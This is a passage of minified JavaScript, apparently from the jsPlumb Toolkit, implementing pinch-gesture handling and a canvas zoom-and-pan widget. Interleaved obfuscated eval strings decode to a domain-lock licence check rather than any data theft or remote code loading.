indow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    this.PinchListener = function (a) {
        var b = "onpointerdown" in document.documentElement, c = "ontouchstart" in document.documentElement, d = [0, 0],
            e = 0, f = 0, g = function (b) {
                a[b](d, f, e, e / f)
            }, h = function () {
                a.onPinchEnd()
            }, i = "onPinchStart", j = "onPinch", k = "pointerdown", l = "pointermove", m = "pointerup", n = "touchstart",
            o = "touchmove", p = "touchend", q = function (a, b, c, d) {
                return Math.sqrt(Math.pow(c - a, 2) + Math.pow(d - b, 2))
            }, r = {
                pointer: function () {
                    var b = {}, c = [], n = 0, o = !1, p = function () {
                        2 === n && (d = [(c[1].p[0] + c[0].p[0]) / 2, (c[1].p[1] + c[0].p[1]) / 2], e = q(c[1].p[0], c[1].p[1], c[0].p[0], c[0].p[1]))
                    }, r = function (a) {
                        n >= 2 || o || (c[n] = {
                            e: a,
                            p: [a.pageX, a.pageY]
                        }, b["" + a.pointerId] = n, n++, p(), 2 === n && (f = e, g(i)))
                    }, s = function (a) {
                        null != b["" + a.pointerId] && (delete b["" + a.pointerId], n--, o = 0 !== n, h())
                    }, t = function (a) {
                        if (!o && 2 === n) {
                            var d = b[a.pointerId];
                            null != d && (c[d].p = [a.pageX, a.pageY], p(), g(j))
                        }
                    };
                    a.bind(a.el, k, r), a.bind(document, m, s), a.bind(document, l, t)
                }, touch: function (a) {
                    var b = function (a) {
                        return a.touches || []
                    }, c = function (a, b) {
                        return a.item ? a.item(b) : a[b]
                    }, k = function (a) {
                        var b = c(a, 0), d = c(a, 1);
                        return q(b.pageX, b.pageY, d.pageX, d.pageY)
                    }, l = function (a) {
                        var b = c(a, 0), d = c(a, 1);
                        return [(b.pageX + d.pageX) / 2, (b.pageY + d.pageY) / 2]
                    }, m = !1, r = function (c) {
                        var h = b(c);
                        2 === h.length && !1 !== a.enableWheelZoom && (d = l(h), e = f = k(h), m = !0, a.bind(document, o, t), a.bind(document, p, s), g(i))
                    }, s = function (b) {
                        m = !1, a.unbind(document, o, t), a.unbind(document, p, s), h()
                    }, t = function (a) {
                        if (m) {
                            var c = b(a);
                            2 === c.length && (e = k(c), d = l(c), g(j))
                        }
                    };
                    a.bind(a.el, n, r)
                }
            };
        b ? r.pointer(a) : c && r.touch(a)
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumb;
    this.ZoomWidget = function (a) {
        function d(b, c) {
            if (g()) return {w: 0, h: 0, x: 0, y: 0, vw: a.width(u), vh: a.height(u), padding: b, z: 1, zoom: 1};
            b = b || 0, c = c || .9;
            var d = Math.abs(na.maxx[0][0][0] + na.maxx[0][1] - na.minx[0][0][0]),
                e = Math.abs(na.maxy[0][0][1] + na.maxy[0][2] - na.miny[0][0][1]), f = a.width(u), h = a.height(u),
                i = f / ((d + 2 * b) / c), j = h / ((e + 2 * b) / c), k = Math.min(i, j);
            return {w: d, h: e, x: na.minx[0][0][0], y: na.miny[0][0][1], vw: f, vh: h, padding: b, z: k, zoom: da}
        }

        function g() {
            for (var a in oa) return !1;
            return !0
        }

        function h(a) {
            for (var b in na) if (na.hasOwnProperty(b)) {
                for (var c = -1, d = 0; d < na[b].length; d++) if (na[b][d][3] === a) {
                    c = d;
                    break
                }
                -1 !== c && na[b].splice(c, 1)
            }
        }

        a.events = a.events || {};
        var i, j, k, l, m, n, o = this, p = function () {
            }, q = a.canvas, r = a.domElement || function (a) {
                return a
            }, s = r(q), t = a.viewport, u = r(t), v = a.events.zoom || p, w = (a.events.maybeZoom, a.events.pan || p),
            x = a.events.mousedown || p, y = a.events.mouseup || p, z = a.events.mousemove || p,
            A = a.events.transformOrigin || p, B = !(!1 === a.clamp), C = !1 !== a.clampZoom, D = a.panDistance || 50,
            E = !1 !== a.enablePan, F = !0 === a.directRender, G = !1 !== a.enableWheelZoom,
            H = !1 !== a.enableAnimation, I = a.wheelFilter || function () {
                return !0
            }, J = !0 === a.wheelZoomMetaKey, K = !0 === a.wheelReverse ? -1 : 1, L = K * (a.wheelSensitivity || 10),
            M = !0 === a.wheelPan, N = !1 !== a.enablePanButtons, O = (a.padding, !1 !== a.consumeRightClick),
            P = a.smartMinimumZoom, Q = !1, R = "mousedown", S = "mouseup", T = "mousemove",
            U = ["webkit", "Moz", "ms"], V = a.bind, W = a.unbind, X = !(!1 === a.enabled), Y = a.clampToBackground,
            Z = a.clampToBackgroundExtents, $ = a.filter || function (a) {
                return !1
            }, _ = a.width, aa = a.height, ba = 0, ca = 0, da = a.zoom || 1, ea = [0, 0], fa = !1, ga = !1, ha = !1,
            ia = !1, ja = a.zoomRange || [.05, 3], ka = 150, la = -1, ma = -1,
            na = {minx: [], maxx: [], miny: [], maxy: []}, oa = {}, pa = {}, qa = {}, ra = !1, sa = function () {
                na.minx.sort(function (a, b) {
                    return a[0][0] < b[0][0] ? -1 : 1
                }), na.miny.sort(function (a, b) {
                    return a[0][1] < b[0][1] ? -1 : 1
                }), na.maxx.sort(function (a, b) {
                    return a[0][0] + a[1] > b[0][0] + b[1] ? -1 : 1
                }), na.maxy.sort(function (a, b) {
                    return a[0][1] + a[2] > b[0][1] + b[2] ? -1 : 1
                })
            }, ta = function (a, b, c, d) {
                null == oa[a] && (oa[a] = [], na.minx.push(oa[a]), na.miny.push(oa[a]), na.maxx.push(oa[a]), na.maxy.push(oa[a])), oa[a][0] = b, oa[a][1] = c, oa[a][2] = d, oa[a][3] = a, Q ? ra = !0 : sa()
            };
        this.setBoundsFor = ta, this.setSize = function (a, b, c) {
            null != oa[a] && (oa[a][1] = b, oa[a][2] = c, sa())
        }, this.setSuspendRendering = function (a) {
            Q = a, !a && ra && sa(), ra = !1
        };
        var ua = function (a, b) {
            return function (c) {
                Wa(s, a * D, b * D, null, !0, function (a) {
                    w(a[0], a[1], da, da, c), i && i.pan(), kb.pan()
                })
            }
        }, va = 150, wa = 60, xa = 10, ya = [], za = null, Aa = null, Ba = null, Ca = function (b, c, d) {
            return function () {
                Ba = d, a.addClass(Ba, "jtk-surface-pan-active"), a.bind(document, "mouseup", Da), za = window.setTimeout(function () {
                    a.bind(document, S, Fa), Aa = window.setInterval(Ea(b, c), wa)
                }, va)
            }
        }, Da = function () {
            window.clearTimeout(za), Ba && a.removeClass(Ba, "jtk-surface-pan-active"), Ba = null
        }, Ea = function (a, b) {
            return function (c) {
                var d = Wa(s, a * xa, b * xa, null);
                w(d[0], d[1], da, da, c), i && i.pan(), kb.pan()
            }
        }, Fa = function () {
            window.clearTimeout(Aa)
        }, Ga = function (b, c, d, e, f) {
            var g = document.createElement("div");
            g.innerHTML = f || "", g.style.position = "absolute";
            for (var h in c) g.style[h] = c[h];
            return g.className = "jtk-surface-pan jtk-surface-pan-" + b, u.appendChild(g), a.bind(g, "click", ua(d, e)), a.bind(g, "mousedown", Ca(d, e, g)), ya.push(g), g
        };
        N && (Ga("top", {left: "0px", top: "0px"}, 0, -1, "&#8593;"), Ga("bottom", {
            left: "0px",
            bottom: "0px"
        }, 0, 1, "&#8595;"), Ga("left", {left: "0px", top: "0px"}, -1, 0, "&#8592;"), Ga("right", {
            right: "0px",
            top: "0px"
        }, 1, 0, "&#8594;"));
        var Ha = function (a, b, c) {
            c = c || s;
            for (var d = 0; d < U.length; d++) {
                var e = a.replace(/([a-z]){1}/, function (a) {
                    return U[d] + a.toUpperCase()
                });
                c.style[e] = b
            }
            c.style[a] = b
        }, Ia = function (a) {
            Ha("transformOrigin", ea[0] + "% " + ea[1] + "%", a)
        }, Ja = function (b, c) {
            var d = o.mapLocation(b, c), e = [d.left, d.top], f = a.width(q), g = a.height(q);
            return {w: f, h: g, xy: e, xScale: e[0] / f, yScale: e[1] / g, o: [e[0] / f * 100, e[1] / g * 100]}
        }, Ka = function (a, b, c, d) {
            var e, f, g, h, i = ea[0] / 100 * b, j = ea[1] / 100 * c;
            e = -i * (1 - da), f = -j * (1 - da), ea = a, Ia(), i = ea[0] / 100 * b, j = ea[1] / 100 * c, g = -i * (1 - da), h = -j * (1 - da);
            var k = Wa(s, g - e, h - f, d);
            A && A(ea, k)
        }, La = function (a, b, c) {
            var d = Ja(a, b);
            Ka(d.o, d.w, d.h, c)
        }, Ma = function (a) {
            var b = Oa(a);
            La(b[0], b[1], a)
        }, Na = function (b, c) {
            var d = a.width(q), e = a.height(q);
            Ka([b / d * 100, c / e * 100], d, e)
        }, Oa = function (a) {
            if (null != a.pageX) return [a.pageX, a.pageY];
            var b = Pa(Qa(a), 0);
            return b ? [b.pageX, b.pageY] : [0, 0]
        };
        this.pageLocation = Oa;
        var Pa = function (a, b) {
            return a.item ? a.item(b) : a[b]
        }, Qa = function (a) {
            return a.touches || []
        }, Ra = function (a, b, c, e, f) {
            if (!F && !(null == a || isNaN(a) || a < 0)) {
                var g = ja[0];
                if (P) {
                    g = .5;
                    var h = d().z;
                    a / h < g && (a = h * g)
                } else a < g && (a = g);
                if (a > ja[1] && (a = ja[1]), e) {
                    var j = a > da ? .05 : -.05, k = da, l = a < da, m = window.setInterval(function () {
                        k = Ra(k + j), l && k <= a && window.clearInterval(m), !l && k >= a && window.clearInterval(m)
                    });
                    return da
                }
                Ha("transform", "scale(" + a + ")");
                var n = da;
                if (da = a, f || v(ba, ca, da, n, b, c), null != i && i.setZoom(a), kb && kb.pan(), C) {
                    var o = Va(s), p = Ua(o[0], o[1]);
                    p[0] == o[0] && p[1] == o[1] || Va(s, p[0], p[1], null, !e)
                }
                return da
            }
        }, Sa = function (a, b, c, d) {
            b < -ka && (b = -ka), b > ka && (b = ka), Ta(k, b, -ka, ka, c, d)
        }, Ta = function (a, b, c, d, e, f) {
            var g = b / (b >= 0 ? d : c), h = b >= 0 ? 1 : 0, i = a + g * (ja[h] - a);
            Ra(i, e, f)
        }, Ua = function (b, c, e) {
            if (B || Y || Z) {
                var f = Xa(), g = b, h = c,
                    j = B ? d() : {x: 0, y: 0, w: 0, h: 0, vw: a.width(u), vh: a.height(u), padding: e, z: 1};
                if (e = (e || 20) * da, (Y || Z) && null != i) {
                    var k = i.getWidth(), l = i.getHeight(), m = Math.max(j.x + j.w, k), n = Math.max(j.y + j.h, l);
                    j.w = m - j.w, j.h = n - j.h;
                    var o = j.vw / j.w, p = j.vh / j.h;
                    j.z = Math.min(o, p), Z && (e = Math.max(j.vw, j.vh))
                }
                var q = [j.x + j.w, j.y + j.h];
                i && (q[0] = Math.max(q[0], i.getWidth()), q[1] = Math.max(q[1], i.getHeight()));
                var r = b + f[0] + q[0] * da - e, s = c + f[1] + q[1] * da - e, t = b + f[0] + j.x * da + e,
                    v = c + f[1] + j.y * da + e;
                return r < 0 && (g -= r), t > j.vw && (g -= t - j.vw), s < 0 && (h -= s), v > j.vh && (h -= v - j.vh), [g, h]
            }
            return [b, c]
        }, Va = function (b, c, d, e, f, g, h) {
            if (1 == arguments.length) return [parseInt(b.style.left, 10) || 0, parseInt(b.style.top, 10) || 0];
            var i = Ua(c, d);
            return H && !f && a.animate ? a.animate(b, {left: i[0], top: i[1]}, {
                step: h, complete: function () {
                    g && g(i)
                }
            }) : (b.style.left = i[0] + "px", b.style.top = i[1] + "px", g && g(i)), i
        };
        s.style.left = "0px", s.style.top = "0px";
        var Wa = function (a, b, c, d, e, f) {
            var g = Va(a);
            return Va(a, g[0] + b, g[1] + c, d, !e, f)
        }, Xa = function () {
            var b = a.width(q), c = a.height(q), d = ea[0] / 100 * b, e = ea[1] / 100 * c;
            return [d * (1 - da), e * (1 - da)]
        }, Ya = {
            start: function (b, c) {
                if (!ga) {
                    var d = b.srcElement || b.target;
                    X && (d === s || d === u || d._jtkDecoration || i && i.owns(d) || !0 === $(d, b)) && (ia = !1, la = -1, ma = -1, 3 !== b.which || !1 === a.enableWheelZoom || null != b.mozInputSource && 1 !== b.mozInputSource ? c.length <= 1 && (fa = !0, j = Oa(b), n = Va(s)) : (ha = !0, j = Oa(b), Ma(b), n = Va(s), k = da)), x(b, o)
                }
            }, move: function (a, b) {
                var c, d, e;
                if (ia = !1, !ga) {
                    if (ha) e = Oa(a), c = e[0] - j[0], d = e[1] - j[1], Sa(c, d, a); else if (fa && E && null != j) {
                        e = Oa(a), c = e[0] - j[0], d = e[1] - j[1];
                        var f = Va(s, n[0] + c, n[1] + d, a, !0);
                        w(f[0], f[1], da, da, a), i && i.pan(), kb && kb.pan()
                    }
                    z(a, o)
                }
            }, end: function (a, b) {
                ga || (ha = !1, j = null, fa = !1, ia = !1, W(document, T, $a), W(document, S, _a), V(document, T, ab), y(a, o))
            }, contextmenu: function (a) {
            }
        }, Za = function (a, b) {
            "contextmenu" === a && O && b.preventDefault && b.preventDefault();
            var c = Qa(b);
            Ya[a](b, c)
        }, $a = function (a) {
            Za("move", a)
        }, _a = function (a) {
            Za("end", a)
        }, ab = function (a) {
            ia = !1
        };
        V(document, T, ab);
        var bb = function (a) {
            X && null != a && (W(document, T, ab), V(document, T, $a), V(document, S, _a), Ya.start(a, Qa(a)))
        };
        if (this.start = bb, V(t, R, bb), V(t, "contextmenu", function (a) {
            Za("contextmenu", a)
        }), G) {
            var cb = function (a, b, c, d) {
                d || fb(100 * -b, 100 * -c)
            }, db = function (a, b, c) {
                k = da, ia || (Ma(a), ia = !0), Sa(0, a.normalizedWheelDelta * L, a, !0)
            }, eb = function (a, b, c, d) {
                I(a) && (a.preventDefault && a.preventDefault(), a.stopPropagation && a.stopPropagation(), !M || d ? db(a, b, c, d) : cb(a, b, c, d))
            };
            addWheelListener(u, eb, !0, J)
        }
        new PinchListener({
            el: t,
            bind: V,
            unbind: W,
            enableWheelZoom: a.enableWheelZoom,
            onPinch: function (a, b, c, d) {
                Ra(d * k);
                var e = a[0] - j[0], f = a[1] - j[1];
                Va(s, n[0] + e, n[1] + f, null, !0)
            },
            onPinchStart: function (a, b) {
                ga = !0, j = a, l = m = b, k = da, La(j[0], j[1]), n = Va(s)
            },
            onPinchEnd: function () {
                ga = !1, j = null
            }
        }), Ra(da, null, !1, !1, !0), Ia(), this.isPinchZooming = function () {
            return ga
        }, this.positionChanged = function (b, c, d) {
            d = d || a.id(b);
            var e = c || Va(b), f = a.width(b), g = a.height(b);
            pa[d] = b, ta(d, e, f, g)
        }, this.add = function (a, b, c, d) {
            this.positionChanged(a, c, b), d && (V(a, R, bb), a._jtkDecoration = !0)
        }, this.suspend = function (b) {
            var c = "string" == typeof b ? b : a.id(b);
            qa[c] = !0, h(c)
        }, this.isSuspended = function (b) {
            var c = "string" == typeof b ? b : a.id(b);
            return !0 === qa[c]
        }, this.restore = function (b) {
            var c = "string" == typeof b ? b : a.id(b);
            delete qa[c], this.positionChanged(b, null, c)
        }, this.remove = function (b) {
            b = r(b);
            var c = a.id(b);
            delete oa[c], delete pa[c], delete qa[c], h(c)
        }, this.reset = function () {
            na.minx.length = 0, na.miny.length = 0, na.maxx.length = 0, na.maxy.length = 0, oa = {}, pa = {}, qa = {}, Va(s, 0, 0, null, !0)
        }, this.getBoundsInfo = d, this.zoomToFit = function (a) {
            a = a || {};
            var b = d(a.padding, a.fill);
            a.doNotZoomIfVisible && b.z > da || Ra(b.z), o.centerContent({
                bounds: b,
                doNotAnimate: !1 !== a.doNotAnimate,
                onComplete: a.onComplete,
                onStep: a.onStep,
                doNotFirePanEvent: a.doNotFirePanEvent
            })
        }, this.zoomToFitIfNecessary = function (a) {
            var c = b.extend(a || {});
            c.doNotZoomIfVisible = !0, this.zoomToFit(c)
        }, this.zoomToElements = function (b) {
            for (var c = {
                x: 1 / 0,
                y: 1 / 0,
                xMax: -1 / 0,
                yMax: -1 / 0,
                z: 1,
                vw: a.width(u),
                vh: a.height(u)
            }, d = 0; d < b.elements.length; d++) {
                var e = b.elements[d], f = oa[a.id(e)];
                f && (c.x = Math.min(c.x, f[0][0]), c.y = Math.min(c.y, f[0][1]), c.xMax = Math.max(c.xMax, f[0][0] + f[1]), c.yMax = Math.max(c.yMax, f[0][1] + f[2]))
            }
            var g = b.fill || .9;
            c.w = c.xMax - c.x, c.h = c.yMax - c.y, c.z = g * Math.min(c.vw / c.w, c.vh / c.h), b.doNotZoomIfVisible && c.z > da || Ra(c.z), o.centerContent({
                bounds: c,
                doNotAnimate: !1 !== b.doNotAnimate,
                onComplete: b.onComplete,
                onStep: b.onStep,
                doNotFirePanEvent: b.doNotFirePanEvent
            })
        }, this.zoomToBackground = function (a) {
            if (a = a || {}, null != i) {
                var b = i.getWidth(), c = i.getHeight(), d = _(u), e = aa(u), f = d / b, g = e / c, h = Math.min(f, g),
                    j = {w: b, h: c, x: 0, y: 0, vw: d, vh: e, padding: 0, z: h};
                Ra(j.z), o.centerContent({
                    bounds: j,
                    doNotAnimate: a.doNotAnimate,
                    onComplete: a.onComplete,
                    onStep: a.onStep
                })
            }
        }, this.setFilter = function (a) {
            $ = a || function (a) {
                return !1
            }
        }, this.centerBackground = function () {
            if (null != i) {
                var c = b.extend({}, d());
                c.x = i.getWidth() / 2, c.y = i.getHeight() / 2, c.w = 1, c.h = 1, o.centerContent({
                    bounds: c,
                    doNotAnimate: a.doNotAnimate,
                    onComplete: a.onComplete,
                    onStep: a.onStep,
                    vertical: !0,
                    horizontal: !0
                })
            }
        }, this.alignBackground = function (a) {
            if (null != i) {
                var b = a.split(" "), c = b[0] || "left", e = b[1] || "top", f = d(),
                    g = "left" === c ? 0 : f.vw - i.getWidth() * da, h = "top" === e ? 0 : f.vh - i.getHeight() * da,
                    j = Xa();
                Va(s, g - j[0], h - j[1]), i.pan(), kb && kb.pan()
            }
        }, this.positionElementAt = function (b, c, d, e, f, g) {
            e = e || 0, f = f || 0;
            var h = Xa(), i = Va(s), j = r(b), k = j.parentNode, l = a.offset(k), m = a.offset(t),
                n = m.left - l.left + (i[0] + h[0]) + c * da + e, o = m.top - l.top + (i[1] + h[1]) + d * da + f;
            g && n < 0 && (n = 0), g && o < 0 && (o = 0), j.style.left = n + "px", j.style.top = o + "px"
        }, this.positionElementAtPageLocation = function (a, b, c, d, e) {
            var f = this.mapLocation(b, c);
            this.positionElementAt(a, f.left, f.top, d, e)
        }, this.positionElementAtEventLocation = function (a, b, c, d) {
            var e = this.mapEventLocation(b);
            this.positionElementAt(a, e.left, e.top, c, d)
        }, this.zoomToEvent = function (a, b) {
            Ma(a), Ra(da + b, a)
        }, this.relayout = function (b) {
            if (!1 === a.enablePan) {
                s.style.width = b[2] - b[0] + "px", s.style.height = b[3] - b[1] + "px", s.style.left = "0", s.style.top = "0";
                var c = b[0] < 0 ? -b[0] : 0, d = b[1] < 0 ? -b[1] : 0;
                s.style.transform = "translateX(" + c + "px) translateY(" + d + "px)", this.setTransformOrigin(0, 0)
            }
        }, this.nudgeZoom = function (b, c) {
            var d = a.offset(u, !0), e = d.left + a.width(u) / 2, f = d.top + a.height(u) / 2;
            return La(e, f), Ra(da + b, c)
        }, this.nudgeWheelZoom = function (a, b) {
            k = da, Sa(0, a, b, !0)
        }, this.centerContent = function (a) {
            if (!F) {
                a = a || {};
                var b = a.bounds || d(), c = Xa(), e = b.x * da + b.w * da / 2, f = b.y * da + b.h * da / 2,
                    g = b.vw / 2 - e, h = b.vh / 2 - f, j = Va(s);
                Va(s, !1 !== a.horizontal ? g - c[0] : j[0], !1 !== a.vertical ? h - c[1] : j[1], null, a.doNotAnimate, function () {
                    a.doNotFirePanEvent || w(!1 !== a.horizontal ? g - j[0] : 0, !1 !== a.vertical ? h - j[1] : 0, da, da), i && i.pan(), kb && kb.pan(), a.onComplete && a.onComplete()
                }, a.onStep)
            }
        }, this.centerContentHorizontally = function (a) {
            this.centerContent(b.extend({horizontal: !0, vertical: !1}, a))
        }, this.centerContentVertically = function (a) {
            this.centerContent(b.extend({vertical: !0, horizontal: !1}, a))
        }, this.centerOn = function (a, c) {
            c = c || {};
            var e = b.extend({}, d()), f = Va(a), g = _(a), h = aa(a);
            e.x = f[0], e.y = f[1], e.w = g, e.h = h;
            var i = function () {
                Na(f[0] + g / 2, f[1] + h / 2), c.onComplete && c.onComplete()
            };
            this.centerContent({
                bounds: e,
                doNotAnimate: c.doNotAnimate,
                onComplete: i,
                onStep: c.onStep,
                vertical: !1 !== c.vertical,
                horizontal: !1 !== c.horizontal
            })
        }, this.centerOnHorizontally = function (a) {
            this.centerOn(a, {vertical: !1})
        }, this.centerOnVertically = function (a) {
            this.centerOn(a, {horizontal: !1})
        }, this.centerOnAndZoom = function (a, b) {
            b = b || .6;
            var c = {w: _(a), h: aa(a)}, e = Va(a), f = d(), g = f.vw < f.vh ? [f.vw, "w"] : [f.vh, "h"], h = b * g[0],
                i = h / c[g[1]];
            i < ja[0] && (i = ja[0]), i > ja[1] && (i = ja[1]);
            var j = da, k = i - da;
            Na(e[0] + c.w / 2, e[1] + c.h / 2), this.centerOn(a, {
                onStep: function (a, b) {
                    Ra(j + a / b * k)
                }, onComplete: function () {
                    Ra(i)
                }
            })
        }, this.getViewportCenter = function () {
            var a = b.extend({}, d()), c = Xa(), e = Va(s), f = [a.vw / 2, a.vh / 2];
            return [(f[0] - (e[0] + c[0])) / da, (f[1] - (e[1] + c[1])) / da]
        }, this.setViewportCenter = function (a) {
            var c = b.extend({}, d()), e = Xa(), f = [c.vw / 2, c.vh / 2],
                g = [-(a[0] * da - f[0] + e[0]), -(a[1] * da - f[1] + e[1])];
            Va(s, g[0], g[1])
        }, this.setClamping = function (a) {
            B = a
        }, this.setZoom = function (a, b, c) {
            return Ra(a, null, null, b, c)
        }, this.setZoomRange = function (a, b) {
            return null != a && 2 === a.length && a[0] < a[1] && null != a[0] && null != a[1] && a[0] > 0 && a[1] > 0 && (ja = a, b || (da < ja[0] || da > ja[1]) && Ra(da)), ja
        }, this.getZoomRange = function () {
            return ja
        }, this.getZoom = function () {
            return da
        }, this.getPan = function () {
            return Va(s)
        };
        var fb = function (a, b, c) {
            Wa(s, a, b, null, c, function (a) {
                w(a[0], a[1], da, da), i && i.pan(), kb && kb.pan()
            })
        };
        this.pan = fb, this.setPan = function (a, b, c, d, e) {
            return Va(s, a, b, null, !c, d, e)
        }, this.setTransformOrigin = function (a, b) {
            ea = [a, b], Ia()
        };
        var gb = this.calculateCumulativeScroll = function (a) {
            for (var b = a, c = 0, d = 0; null != b && b !== document.body;) isNaN(b.scrollLeft) || (c += b.scrollLeft), isNaN(b.scrollTop) || (d += b.scrollTop), b = b.parentNode;
            return {left: c, top: d}
        }, hb = this.calculateOffset = function (a) {
            for (var b = a, c = 0, d = 0; null != b && b !== document.body;) c += b.offsetLeft, d += b.offsetTop, b = b.offsetParent;
            return {left: c, top: d}
        };
        this.mapLocation = function (a, b, c) {
            var d = Xa(), e = Va(s), f = gb(u), g = c ? {left: 0, top: 0} : hb(u);
            return {left: (a - (e[0] + d[0]) - g.left + f.left) / da, top: (b - (e[1] + d[1]) - g.top + f.top) / da}
        }, this.mapEventLocation = function (a, b) {
            var c = Oa(a);
            return this.mapLocation(c[0], c[1], b)
        }, this.setEnabled = function (a) {
            X = a
        }, this.showElementAt = function (b, c, d) {
            var e = r(b), f = e.parentNode, g = a.offset(f), h = a.offset(t), i = Xa(), j = g.left - h.left + i[0] + c,
                k = g.top - h.top + i[1] + d;
            a.offset(b, {left: j, top: k})
        }, this.getApparentCanvasLocation = function () {
            var a = Xa(), b = Va(s);
            return [b[0] + a[0], b[1] + a[1]]
        }, this.setApparentCanvasLocation = function (a, b) {
